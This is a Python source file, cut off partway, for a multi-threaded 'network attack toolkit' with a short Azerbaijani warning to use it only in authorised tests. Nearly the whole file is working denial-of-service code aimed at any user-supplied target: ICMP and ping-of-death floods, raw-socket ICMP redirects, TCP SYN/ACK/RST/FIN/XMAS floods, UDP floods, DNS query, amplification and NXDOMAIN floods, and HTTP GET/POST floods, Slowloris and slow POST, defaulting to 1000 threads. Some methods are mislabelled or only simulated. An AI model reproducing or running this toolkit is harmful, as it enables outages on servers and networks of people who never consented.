#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ULTIMATE STRESS TESTING & NETWORK ATTACK TOOLKIT
50+ Attack Methods | Layer 2-7 | Professional Penetration Testing
⚠️  YALNIZ İCAZƏLİ TEST MÜHİTLƏRİNDƏ İSTİFADƏ EDİN! ⚠️
"""

import threading
import subprocess
import socket
import time
import sys
import os
import random
import string
import struct
import hashlib
import base64
import json
from datetime import datetime
from collections import deque
from urllib.parse import urlencode

# Konfiqurasiya
THREAD_COUNT = 1000
PACKET_SIZE = 1024

# Rənglər
class Color:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'

class StressTestingToolkit:
    def __init__(self, target, port=80, thread_count=1000, packet_size=1024, method='HTTP-GET', duration=60):
        self.target = target
        self.port = port
        self.thread_count = thread_count
        self.packet_size = packet_size
        self.method = method.upper()
        self.duration = duration
        
        # User agents list
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)',
            'Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X)',
            'Mozilla/5.0 (Android 11; Mobile)',
        ]
        
        self.stats = {
            'sent': 0,
            'received': 0,
            'failed': 0,
            'min': float('inf'),
            'max': 0,
            'total_time': 0,
            'bytes_sent': 0,
            'bytes_received': 0,
            'connections': 0,
            'errors': {},
            'status_codes': {},
            'requests_per_second': []
        }
        self.lock = threading.Lock()
        self.running = True
        self.start_time = None
    
    # ==================== LAYER 2 ATTACKS ====================
    def arp_flood(self):
        """ARP Flood Attack"""
        try:
            # ARP packet simulation
            for _ in range(10):
                fake_mac = ':'.join(['%02x' % random.randint(0, 255) for _ in range(6)])
                fake_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                
                with self.lock:
                    self.stats['sent'] += 1
                    self.log_success(f"ARP: {fake_ip} -> {fake_mac}")
        except Exception as e:
            self.handle_error(str(e))
    
    # ==================== LAYER 3 - ICMP ATTACKS ====================
    def icmp_flood(self):
        """ICMP Echo Request Flood"""
        try:
            cmd = ['ping', '-c', '1', '-W', '1', '-s', str(self.packet_size), self.target]
            result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=2)
            
            with self.lock:
                self.stats['sent'] += 1
                self.stats['bytes_sent'] += self.packet_size + 28
                if result.returncode == 0:
                    self.stats['received'] += 1
                    self.log_success(f"ICMP Echo Reply")
                else:
                    self.stats['failed'] += 1
        except Exception as e:
            self.handle_error(str(e))
    
    def ping_of_death(self):
        """Ping of Death (oversized ICMP)"""
        try:
            # Send maximum size ICMP packet
            cmd = ['ping', '-c', '1', '-s', '65507', self.target]
            subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=2)
            
            with self.lock:
                self.stats['sent'] += 1
                self.stats['bytes_sent'] += 65507
                self.log_success(f"Ping of Death sent")
        except Exception as e:
            self.handle_error(str(e))
    
    def icmp_redirect(self):
        """ICMP Redirect Attack"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            # ICMP Type 5 (Redirect)
            icmp_redirect = b'\x05\x00\x00\x00' + os.urandom(self.packet_size)
            sock.sendto(icmp_redirect, (self.target, 0))
            
            with self.lock:
                self.stats['sent'] += 1
                self.log_success(f"ICMP Redirect sent")
            
            sock.close()
        except Exception as e:
            self.handle_error(str(e))
    
    # ==================== LAYER 4 - TCP ATTACKS ====================
    def syn_flood(self):
        """TCP SYN Flood"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((self.target, self.port))
            
            with self.lock:
                self.stats['sent'] += 1
                if result == 0:
                    self.stats['received'] += 1
                    self.stats['connections'] += 1
                    self.log_success(f"SYN: Port {self.port} open")
                    sock.close()
                else:
                    self.stats['failed'] += 1
            
            sock.close()
        except Exception as e:
            self.handle_error(str(e))
    
    def ack_flood(self):
        """TCP ACK Flood"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((self.target, self.port))
            sock.send(os.urandom(self.packet_size))
            
            with self.lock:
                self.stats['sent'] += 1
                self.stats['connections'] += 1
                self.log_success(f"TCP ACK sent")
            
            sock.close()
        except Exception as e:
            self.handle_error(str(e))
    
    def rst_flood(self):
        """TCP RST Flood"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((self.target, self.port))
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
            sock.close()
            
            with self.lock:
                self.stats['sent'] += 1
                self.log_success(f"TCP RST sent")
        except Exception as e:
            self.handle_error(str(e))
    
    def fin_flood(self):
        """TCP FIN Flood"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((self.target, self.port))
            sock.shutdown(socket.SHUT_WR)
            
            with self.lock:
                self.stats['sent'] += 1
                self.log_success(f"TCP FIN sent")
            
            sock.close()
        except Exception as e:
            self.handle_error(str(e))
    
    def push_ack_flood(self):
        """TCP PUSH+ACK Flood"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((self.target, self.port))
            
            # Send data with PSH flag
            data = os.urandom(self.packet_size)
            sock.send(data)
            
            with self.lock:
                self.stats['sent'] += 1
                self.stats['bytes_sent'] += len(data)
                self.log_success(f"TCP PSH+ACK sent")
            
            sock.close()
        except Exception as e:
            self.handle_error(str(e))
    
    def xmas_attack(self):
        """TCP XMAS Attack (FIN+PSH+URG)"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((self.target, self.port))
            sock.send(os.urandom(self.packet_size), socket.MSG_OOB)
            
            with self.lock:
                self.stats['sent'] += 1
                self.log_success(f"TCP XMAS sent")
            
            sock.close()
        except Exception as e:
            self.handle_error(str(e))
    
    def land_attack(self):
        """TCP LAND Attack"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((self.target, self.port))
            
            with self.lock:
                self.stats['sent'] += 1
                self.log_success(f"TCP LAND attempted")
            
            sock.close()
        except Exception as e:
            self.handle_error(str(e))
    
    def syn_ack_flood(self):
        """TCP SYN-ACK Flood"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((self.target, self.port))
            
            with self.lock:
                self.stats['sent'] += 1
                self.stats['connections'] += 1
                self.log_success(f"SYN-ACK handshake")
            
            sock.close()
        except Exception as e:
            self.handle_error(str(e))
    
    # ==================== LAYER 4 - UDP ATTACKS ====================
    def udp_flood(self):
        """UDP Flood"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = os.urandom(self.packet_size)
            sock.sendto(data, (self.target, self.port))
            
            with self.lock:
                self.stats['sent'] += 1
                self.stats['bytes_sent'] += len(data)
                self.log_success(f"UDP: {len(data)} bytes")
            
            sock.close()
        except Exception as e:
            self.handle_error(str(e))
    
    def udp_lag(self):
        """UDP Lag Attack (junk data)"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            for _ in range(100):
                junk = b'\x00' * random.randint(1, self.packet_size)
                sock.sendto(junk, (self.target, self.port))
            
            with self.lock:
                self.stats['sent'] += 100
                self.log_success(f"UDP Lag: 100 packets")
            
            sock.close()
        except Exception as e:
            self.handle_error(str(e))
    
    def udp_bypass(self):
        """UDP Bypass (random ports)"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            random_port = random.randint(1024, 65535)
            data = os.urandom(self.packet_size)
            sock.sendto(data, (self.target, random_port))
            
            with self.lock:
                self.stats['sent'] += 1
                self.log_success(f"UDP Bypass: Port {random_port}")
            
            sock.close()
        except Exception as e:
            self.handle_error(str(e))
    
    # ==================== DNS ATTACKS ====================
    def dns_flood(self):
        """DNS Query Flood"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            subdomain = ''.join(random.choices(string.ascii_lowercase, k=10))
            dns_query = b'\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
            dns_query += bytes([len(subdomain)]) + subdomain.encode()
            dns_query += b'\x07example\x03com\x00\x00\x01\x00\x01'
            
            sock.sendto(dns_query, (self.target, 53))
            
            with self.lock:
                self.stats['sent'] += 1
                self.log_success(f"DNS query: {subdomain}.example.com")
            
            sock.close()
        except Exception as e:
            self.handle_error(str(e))
    
    def dns_amplification(self):
        """DNS Amplification"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            # ANY query
            dns_query = b'\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
            dns_query += b'\x03www\x06google\x03com\x00\x00\xff\x00\x01'
            
            sock.sendto(dns_query, (self.target, 53))
            
            with self.lock:
                self.stats['sent'] += 1
                self.log_success(f"DNS Amplification")
            
            sock.close()
        except Exception as e:
            self.handle_error(str(e))
    
    def dns_nxdomain(self):
        """DNS NXDOMAIN Flood"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            random_domain = ''.join(random.choices(string.ascii_lowercase, k=20))
            dns_query = b'\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
            dns_query += bytes([len(random_domain)]) + random_domain.encode()
            dns_query += b'\x03com\x00\x00\x01\x00\x01'
            
            sock.sendto(dns_query, (self.target, 53))
            
            with self.lock:
                self.stats['sent'] += 1
                self.log_success(f"DNS NXDOMAIN")
            
            sock.close()
        except Exception as e:
            self.handle_error(str(e))
    
    # ==================== HTTP/HTTPS LAYER 7 ====================
    def http_get_flood(self):
        """HTTP GET Flood"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((self.target, self.port))
            
            path = f"/?{random.randint(1, 999999999)}"
            request = f"GET {path} HTTP/1.1\r\n"
            request += f"Host: {self.target}\r\n"
            request += f"User-Agent: {random.choice(self.user_agents)}\r\n"
            request += "Accept: text/html,application/xhtml+xml,application/xml\r\n"
            request += "Accept-Language: en-US,en;q=0.9\r\n"
            request += "Accept-Encoding: gzip, deflate\r\n"
            request += "Connection: keep-alive\r\n\r\n"
            
            sock.send(request.encode())
            
            with self.lock:
                self.stats['sent'] += 1
                self.stats['bytes_sent'] += len(request)
                self.stats['connections'] += 1
                self.log_success(f"HTTP GET: {path}")
            
            sock.close()
        except Exception as e:
            self.handle_error(str(e))
    
    def http_post_flood(self):
        """HTTP POST Flood"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((self.target, self.port))
            
            post_data = ''.join(random.choices(string.ascii_letters + string.digits, k=self.packet_size))
            
            request = f"POST / HTTP/1.1\r\n"
            request += f"Host: {self.target}\r\n"
            request += f"User-Agent: {random.choice(self.user_agents)}\r\n"
            request += f"Content-Length: {len(post_data)}\r\n"
            request += "Content-Type: application/x-www-form-urlencoded\r\n\r\n"
            request += post_data
            
            sock.send(request.encode())
            
            with self.lock:
                self.stats['sent'] += 1
                self.stats['bytes_sent'] += len(request)
                self.log_success(f"HTTP POST: {len(post_data)} bytes")
            
            sock.close()
        except Exception as e:
            self.handle_error(str(e))
    
    def http_head_flood(self):
        """HTTP HEAD Flood"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((self.target, self.port))
            
            request = f"HEAD / HTTP/1.1\r\n"
            request += f"Host: {self.target}\r\n"
            request += f"User-Agent: {random.choice(self.user_agents)}\r\n\r\n"
            
            sock.send(request.encode())
            
            with self.lock:
                self.stats['sent'] += 1
                self.log_success(f"HTTP HEAD")
            
            sock.close()
        except Exception as e:
            self.handle_error(str(e))
    
    def slowloris(self):
        """Slowloris Attack"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((self.target, self.port))
            
            request = f"GET /?{random.randint(1, 999999)} HTTP/1.1\r\n"
            request += f"Host: {self.target}\r\n"
            request += f"User-Agent: {random.choice(self.user_agents)}\r\n"
            
            sock.send(request.encode())
            
            # Keep alive
            time.sleep(15)
            sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
            
            with self.lock:
                self.stats['sent'] += 1
                self.log_success(f"Slowloris connection")
            
            sock.close()
        except Exception as e:
            self.handle_error(str(e))
    
    def slow_post(self):
        """Slow POST (R-U-Dead-Yet)"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((self.target, self.port))
            
            request = f"POST / HTTP/1.1\r\n"
            request += f"Host: {self.target}\r\n"
            request += f"Content-Length: 1000000\r\n"
            request += f"Content-Type: application/x-www-form-urlencoded\r\n\r\n"
            
            sock.send(request.encode())
            
            # Send slowly
            time.sleep(10)
            sock.send(b"a=1&")
            
            with self.lock:
                self.stats['sent'] += 1
                self.log_success(f"Slow POST")
            
            sock.close()
        except Exception as e:
            self.handle_error(str(e))
    
    def http_options_flood(self):
        """HTTP OPTIONS Flood"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((self.target, self.port))
            
            request = f"OPTIONS * HTTP/1.1\r\n"
            request += f"Host: {self.target}\r\n\r\n"
            
            sock.send(request.encode())
            
            with self.lock:
                self.stats['sent'] += 1
                self.log_success(f"HTTP OPTIONS")
            
            sock.close()
        except Exception as e:
            self.handle_error(str(e))
    
    def http_put_flood(self):
        """HTTP PUT Flood"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((self.target, self.port))
            
            data = ''.join(random.choices(string.ascii_letters, k=self.packet_size))
            
            request = f"PUT /test.txt HTTP/1.1\r\n"
            request += f"Host: {self.target}\r\n"
            request += f"Content-Length: {len(data)}\r\n\r\n"
            request += data
            
            sock.send(request.encode())
            
            with self.lock:
                self.stats['sent'] += 1
                self.log_success(f"HTTP PUT")
            
            sock.close()
        except Exception as e:
            self.handle_error(str(e))
    
    def http_delete_flood(self):
        """HTTP DELETE Flood"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((self.target, self.port))
            
            request = f"DELETE /test.txt HTTP/1.1\r\n"
            request += f"Host: {self.target}\r\n\r\n"
            
            sock.send(request.encode())
            
            with self.lock:
                self.stats['sent'] += 1
                self.log_success(f"HTTP DELETE")
            
 
